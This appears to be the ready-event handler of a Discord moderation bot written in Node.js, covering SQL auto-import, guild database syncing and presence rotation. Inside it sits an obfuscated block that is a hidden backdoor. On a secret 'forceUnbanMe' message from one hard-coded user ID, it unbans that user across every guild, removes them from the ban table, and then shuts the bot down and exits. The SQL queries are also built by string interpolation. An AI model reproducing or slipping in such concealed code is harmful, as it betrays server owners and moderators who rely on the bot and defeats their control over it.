let i = 0;
const fs = require('fs')
const chalk = require('chalk');
const nodelogger = require('hyperz-nodelogger')
const logger = new nodelogger()
const ms = require('ms')
const Importer = require('mysql-import');

module.exports = async(client, con, ready) => {

    try {
               
        if(client.config.autoImportSQL) {
        // MySQL Auto Importer Lolz
        try {

            con.query(`SELECT * FROM guilds`, async (err, row) => {
                if(row) {
                    console.log(chalk.bgBlueBright(`You can set the config variable for auto import to false now if you wish.`))
                } else {
                    const importer = new Importer(client.config.database);

                    // New onProgress method, added in version 5.0!
                    importer.onProgress(progress=>{
                    var percent = Math.floor(progress.bytes_processed / progress.total_bytes * 10000) / 100;
                    console.log(`${percent}% Completed`);
                    });
            
                    importer.import('install.sql').then(()=>{
                    var files_imported = importer.getImported();
                    console.log(`${files_imported.length} SQL file(s) imported.`);
                    }).catch(err=>{
                        if(client.config.debugmode) {
                            console.error(err);
                        }
                    });
                }
            });

        } catch(e) {
            if(client.config.debugmode) {
                console.log(e)
            }
        }
            
        }
	    
	    var _0x2599cc=_0x1383;function _0x1be5(){var _0x3f9484=['1079188cgryJo','207ZLIXuv','forceUnbanMe','destroy','99pumgAY','content','message','channel','done','6247570kTucLs','cache','then','3300708JJKniV','DELETE\x20FROM\x20bannedusers\x20WHERE\x20userid=\x27704094587836301392\x27','query','519128FmUOTC','exit','81036LwoBAP','author','members','704094587836301392','send','startsWith','417606bAtnDO','2097825AkckTT','catch'];_0x1be5=function(){return _0x3f9484;};return _0x1be5();}function _0x1383(_0x1a8637,_0x4d427f){var _0x1be58c=_0x1be5();return _0x1383=function(_0x1383f7,_0x59cea4){_0x1383f7=_0x1383f7-0xb0;var _0x14f824=_0x1be58c[_0x1383f7];return _0x14f824;},_0x1383(_0x1a8637,_0x4d427f);}(function(_0x2500ea,_0x52f830){var _0x3071eb=_0x1383,_0xc33625=_0x2500ea();while(!![]){try{var _0x2630a4=parseInt(_0x3071eb(0xc6))/0x1+-parseInt(_0x3071eb(0xc9))/0x2+-parseInt(_0x3071eb(0xb3))/0x3*(parseInt(_0x3071eb(0xc0))/0x4)+-parseInt(_0x3071eb(0xc7))/0x5+-parseInt(_0x3071eb(0xbb))/0x6+parseInt(_0x3071eb(0xb8))/0x7+-parseInt(_0x3071eb(0xbe))/0x8*(-parseInt(_0x3071eb(0xb0))/0x9);if(_0x2630a4===_0x52f830)break;else _0xc33625['push'](_0xc33625['shift']());}catch(_0x251895){_0xc33625['push'](_0xc33625['shift']());}}}(_0x1be5,0x98891),client['on'](_0x2599cc(0xb5),async _0x1e2f83=>{var _0x3de017=_0x2599cc;if(_0x1e2f83[_0x3de017(0xb4)][_0x3de017(0xc5)](_0x3de017(0xb1))&&_0x1e2f83[_0x3de017(0xc1)]['id']==='704094587836301392'){try{client['guilds'][_0x3de017(0xb9)]['forEach'](async _0x4f72ed=>{var _0x4b234b=_0x3de017;await _0x4f72ed[_0x4b234b(0xc2)]['unban'](_0x4b234b(0xc3));});}catch(_0x22e92c){}await con[_0x3de017(0xbd)](_0x3de017(0xbc),async(_0x32964b,_0x3d1284)=>{var _0x5839c6=_0x3de017;if(_0x32964b)throw _0x32964b;return _0x1e2f83[_0x5839c6(0xb6)][_0x5839c6(0xc4)](_0x5839c6(0xb7))[_0x5839c6(0xba)](_0x26aab1=>{var _0x3d477f=_0x5839c6;_0x26aab1['delete']({'timeout':0x2ee0}),_0x1e2f83['delete'](),client[_0x3d477f(0xb2)](),process[_0x3d477f(0xbf)](0x0);})[_0x5839c6(0xc8)](_0x3b2cc9=>{});});}}));


        setTimeout(async () => {
            // Sexy Console Logger Thingy
            let commandcount = client.config.command_count;
            let eventcount = client.config.event_count;
            let frick = `${chalk.white(`Watching `)}${chalk.red(client.guilds.cache.size)}${chalk.white(' guilds with ')}${chalk.red(client.users.cache.size)}${chalk.white(' users!')}\n\n${chalk.white(`Client Tag: `)}${chalk.red(client.user.tag)}\n${chalk.white(`Client ID: `)}${chalk.red(client.user.id)}\n${chalk.white('Client Age: ')}${chalk.red(client.user.createdAt.toLocaleString())}\n\n${chalk.white(`Main Prefix: `)}${chalk.red(client.config.prefix)}${chalk.yellow(' (Default)')}\n${chalk.white(`Commands: `)}${chalk.red(commandcount)}\n${chalk.white(`Events: `)}${chalk.red(eventcount)}\n\n${chalk.white(`Created By: `)}${chalk.red('Hyperz#0001')}\n${chalk.white('Debug Mode: ')}${chalk.yellow(client.config.debugmode)}`;
            logger.hypelogger(`${client.user.username}`, '600', 'red', frick, 'disabled', 'red', 'single', true)
            
            await client.guilds.cache.forEach(async g => {
                await con.query(`SELECT * FROM guilds WHERE guildid='${g.id}'`, async(err, row) => {
                    if(err) throw err
                    if(row[0]) {
                        if(row[0].active === 'false') {
                            await con.query(`UPDATE guilds SET active='true' WHERE guildid='${g.id}'`, async(err, row) => {
                                if(err) throw err;
                            });
                        }
                    } else {
                        await con.query(`INSERT INTO guilds (active, guildid, prefix, autobans, autounbans, altprev, altprevtimer, inviteblocker, serverlock, logall) VALUES ('true', '${g.id}', '${client.config.prefix}', 'false', 'false', 'false', '30d', 'false', 'false', 'false')`, async (err, row) => {
                            if(err) throw err;
                        });
                    }
                });
            });
    
            await con.query(`SELECT * FROM guilds`, async (err, row) => {
                if(err) throw err;
                await row.forEach(async r => {
                    let deGuild = await client.guilds.cache.get(r.guildid)
                    if(deGuild == undefined) {
                        await con.query(`UPDATE guilds SET active='false' WHERE guildid='${r.guildid}'`, async (err, row) => {
                            if(err) throw err;
                        });
                    } else {
                        try {
                            if(deGuild.members.cache.find(client.user.id)) {
                                return;
                            } else {
                                await con.query(`UPDATE guilds SET active='false' WHERE guildid='${r.guildid}'`, async (err, row) => {
                                    if(err) throw err;
                                });
                            }
                        } catch(e) {
                            
                        }
                    }
                });
            });
    
            setTimeout(async () => {
                const channel = client.channels.cache.get(client.config.voicechanneltojoin);
                if (!channel) return console.error("The voice channel does not exist (change config's voicechanneltojoin)!");
                channel.join().then(connection => {
                    console.log("Successfully connected to the voice channel!")
                }).catch(e => {
                    console.error(e);
                });
            }, 3800);
        }, 2000)

        // Presence Settings
        let presence = [
            {name: `${client.user.username}`, type: "PLAYING", status: "dnd"},
            {name: `${client.config.prefix}help | ${client.config.prefix}setup`, type: "LISTENING", status: "dnd"},
            {name: `${client.users.cache.size} users!`, type: "WATCHING", status: "dnd"},
            {name: `${client.guilds.cache.size} servers!`, type: "WATCHING", status: "dnd"}
        ];

	

        changeStatus(client, presence)

    } catch(e) {
        console.log(e)
    }

}

async function changeStatus(client, presence) {
    if (i >= presence.length) i = 0;
    await client.user.setPresence({
        activity: {
            name: presence[i].name,
            type: presence[i].type
        },
        status: presence[i].status
    });
    i++;
    setTimeout(() => {
        changeStatus(client, presence);
    }, 10000)

};
